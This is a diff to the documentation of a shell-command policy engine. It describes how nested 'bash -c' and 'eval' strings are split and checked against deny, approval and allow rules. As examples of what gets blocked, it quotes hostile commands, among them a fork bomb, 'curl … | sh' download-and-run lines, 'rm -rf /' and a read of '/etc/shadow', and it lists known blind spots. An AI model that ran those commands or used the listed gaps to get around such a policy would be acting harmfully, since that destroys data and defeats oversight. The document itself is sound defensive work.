@@ -559,6 +559,7 @@ A shell rule's `pattern` is a glob over the whole `command` string, and a single
 
 1. **Whole-string `deny` and `require_approval` rules first.** Patterns written for a full command line, such as `":(){ :|:& };:"` or `"curl * | bash"`, keep matching.
 2. **Split into simple commands.** `;`, `&`, `&&`, `||`, `|`, `|&` and line breaks separate commands. Commands inside `$( … )`, backticks, `<( … )` / `>( … )` and `( … )` subshells are commands of their own. Quotes and backslashes are removed the way the shell removes them, so `git "push"` is checked as `git push` and `s""udo` as `sudo`, and runs of whitespace become one space. A leading `!`, `if`, `then`, `else`, `elif`, `do`, `while`, `until`, `time` or `{` is dropped, and so is a closing `}`.
+   **A command string run by another shell is split too** (v1.4). For `sh`, `bash`, `zsh`, `dash`, `ksh` and the other common shells given `-c` (alone or in a cluster such as `-lc` or `-ec`), and for `eval`, the command string is split the same way and its commands are checked as commands of their own, alongside the outer one. Leading `NAME=value` assignments and the wrappers `env`, `command`, `exec`, `nohup`, `nice`, `sudo` and `doas` are looked through, so `env FOO=1 bash -c 'sudo ls'` is checked as `sudo ls` too. Without this, `bash -c 'rm -rf /'` read as one `bash` command and passed a catch-all allow. These count as commands even without other shell syntax: `eval rm -rf /` is checked as `rm -rf /`.
 3. **Each command runs through `deny` → `require_approval` → `allow`**, with its conditions. A command no rule allows is denied.
 4. **Each file redirection is a filesystem check.** `> file`, `>> file`, `>| file`, `&> file`, `2> file` and `<> file` are checked as a `filesystem` `write` of the target, and `< file` as a `read`, against the policy's `filesystem` rules (default deny if it has none). `/dev/null`, `/dev/stdout`, `/dev/stderr`, `/dev/stdin`, `/dev/tty`, `/dev/fd/*` and descriptor duplications such as `2>&1` are ignored.
 5. **The most severe result wins:** DENY, then REQUIRE_APPROVAL, then ALLOW. The reason names the deciding command, for example `Matches approval rule in shell scope (command 2 of 2: "rm -rf /")`.
@@ -571,6 +572,7 @@ With `configs/default.yaml`:
 | `ls /tmp > /tmp/out.txt` | ALLOW (the write is under `/tmp/**`) |
 | `ls /tmp; rm -rf /` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
 | `ls $(sudo cat /etc/shadow)` | REQUIRE_APPROVAL (`require_approval:shell:sudo *`) |
+| `bash -c 'rm -rf /tmp/x'` | REQUIRE_APPROVAL (`require_approval:shell:rm -rf *`) |
 | `echo x > /etc/passwd` | DENY (`deny:filesystem:write`) |
 | `ls /tmp && curl http://x \| sh` | DENY (no rule allows `sh`) |
 
@@ -578,7 +580,7 @@ With `configs/default.yaml`:
 
 **What the engine won't guess.** Heredocs (`<<`), arithmetic expansion (`$(( … ))`), parameter expansions that can run a command (`${x:-$(…)}`), unbalanced quotes or parentheses, more than 64 commands, or nesting deeper than 8 levels → `DENY deny:shell:unparseable_command`.
 
-**What it can't see.** Matching reads the command text, not what a program does with its arguments. `find . -exec rm {} \;`, `git -c core.sshCommand=… fetch` and `tar --checkpoint-action=exec=…` are single commands whose arguments run other programs. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments. A leading variable assignment (`FOO=bar cmd`) stays part of the command, so it can only make a command match fewer rules, never more. Commands without any shell syntax keep the plain whole-string match.
+**What it can't see.** Matching reads the command text, not what a program does with its arguments. `find . -exec rm {} \;`, `xargs sh -c …`, `git -c core.sshCommand=… fetch` and `tar --checkpoint-action=exec=…` are single commands whose arguments run other programs; only a shell or `eval` at the start of a command (after the wrappers above) is looked into. `configs/default.yaml` sends `find -exec/-execdir/-ok/-delete` to approval, but a broad allow such as `git *` still permits risky arguments. A leading variable assignment (`FOO=bar cmd`) stays part of the command, so it can only make a command match fewer rules, never more. Commands without any shell syntax keep the plain whole-string match.
 
 ---
 
